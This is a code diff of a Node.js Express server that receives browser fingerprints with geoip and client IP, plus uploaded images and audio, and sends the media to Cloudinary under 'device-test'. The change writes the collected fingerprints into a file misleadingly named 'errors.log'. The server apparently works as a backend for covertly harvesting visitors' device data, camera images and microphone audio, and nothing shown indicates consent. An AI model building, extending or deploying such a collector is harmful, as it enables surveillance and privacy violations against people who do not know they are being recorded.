@@ -1,4 +1,8 @@
 const cloudinary = require('cloudinary').v2;
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const geoip = require('geoip-lite');
 
 cloudinary.config({
   cloud_name: process.env.CLOUD_NAME,
@@ -6,50 +10,36 @@ cloudinary.config({
   api_secret: process.env.API_SECRET
 });
 
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
 const app = express();
-const geoip = require('geoip-lite');
 
-// Initialize directories
-const dataDirs = [
-  path.join('data', 'media', 'images'),
-  path.join('data', 'media', 'audio'),
-  path.join('data', 'fingerprints')
-];
-
-// Create directories if they don't exist
+// Create folders locally (optional, if not using local storage anymore)
 function initializeDirectories() {
-  dataDirs.forEach(dir => {
-    if (!fs.existsSync(dir)) {
-      fs.mkdirSync(dir, { recursive: true });
-      console.log(`Created directory: ${dir}`);
-    }
-  });
-  
   if (!fs.existsSync('data/errors.log')) {
+    fs.mkdirSync('data', { recursive: true });
     fs.writeFileSync('data/errors.log', '');
   }
 }
-
 initializeDirectories();
 
-// Get real client IP
-function getClientIp(req) {
-  return req.ip || req.connection.remoteAddress;
-}
-
+// Middleware
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
-app.use('/data', express.static(path.join(__dirname, 'data')));
 
-
-// Enable CORS for mobile testing
+// CORS for testing
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
   next();
+});
+
+// Get client IP
+function getClientIp(req) {
+  return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+}
+
+// Basic root route for health check
+app.get('/', (req, res) => {
+  res.send('Server is running');
 });
 
 // Fingerprint endpoint
@@ -63,12 +53,8 @@ app.post('/collect-fingerprint', (req, res) => {
       ...req.body
     };
 
-    const filename = `fingerprint-${Date.now()}.json`;
-    fs.writeFileSync(
-      path.join(__dirname, 'data', 'fingerprints', filename),
-      JSON.stringify(fingerprint, null, 2)
-    );
-    
+    const log = `[${new Date().toISOString()}] ${JSON.stringify(fingerprint)}\n`;
+    fs.appendFileSync('data/errors.log', log);
     res.sendStatus(200);
   } catch (err) {
     console.error('Fingerprint error:', err);
@@ -76,31 +62,31 @@ app.post('/collect-fingerprint', (req, res) => {
   }
 });
 
-// Media endpoint
-app.post('/collect-media', (req, res) => {
+// Media endpoint with Cloudinary
+app.post('/collect-media', async (req, res) => {
   try {
     const { type, data, extension } = req.body;
-    
+
     if (!['image', 'audio'].includes(type)) {
       return res.status(400).send('Invalid media type');
     }
 
-    const filename = `${type}-${Date.now()}.${extension}`;
-    const folder = type === 'audio' ? 'audio' : 'images';
-    const filePath = path.join(__dirname, 'data', 'media', folder, filename);
-
-
     const base64Data = data.split(',')[1] || data;
-    cloudinary.uploader.upload(`data:${type}/${extension};base64,${base64Data}`, {   folder: `device-test/${type}` }) .then(result => {   console.log(`${type} uploaded to Cloudinary:`, result.secure_url);   res.sendStatus(200); }) .catch(error => {   console.error(`${type} upload failed:`, error);   res.status(500).send('Cloudinary upload failed'); });
-    
+    const uploadDataUri = `data:${type}/${extension};base64,${base64Data}`;
+
+    const result = await cloudinary.uploader.upload(uploadDataUri, {
+      folder: `device-test/${type}`
+    });
+
+    console.log(`${type} uploaded:`, result.secure_url);
     res.sendStatus(200);
   } catch (err) {
-    console.error('Media save error:', err);
-    res.status(500).send('Error saving media');
+    console.error('Media upload error:', err);
+    res.status(500).send('Error uploading media');
   }
 });
 
-// Error logging endpoint
+// Log client-side errors
 app.post('/log-error', (req, res) => {
   try {
     console.error('Client error:', req.body.error);
@@ -111,7 +97,8 @@ app.post('/log-error', (req, res) => {
   }
 });
 
-app.listen(3000, '0.0.0.0', () => {
-  console.log('Server running on http://0.0.0.0:3000');
-  console.log('Access from mobile: http://<your-local-ip>:3000');
+// Use environment port (Render requirement)
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
 });
